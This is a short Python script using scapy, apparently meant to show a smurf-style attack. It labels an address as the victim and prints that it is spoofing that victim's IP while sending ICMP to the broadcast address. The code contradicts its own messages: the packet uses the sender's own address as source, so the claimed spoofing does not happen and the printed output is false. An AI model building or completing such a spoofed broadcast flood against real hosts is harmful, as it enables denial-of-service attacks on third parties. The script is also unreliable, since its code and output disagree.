from scapy.all import IP, ICMP, send
import socket

victim_ip = "192.167.1.50"
my_ip = socket.gethostbyname(socket.gethostname())
broadcast_ip = "255.255.255.255"

print(f"Constructing packet...")
print(f"Spoofing Source IP as: {victim_ip}")
print(f"Sending to Broadcast: {broadcast_ip}")

packet = IP(src=my_ip, dst=broadcast_ip) / ICMP()

print("\nPacket Header Details:")
packet.show() 

send(packet, count=1)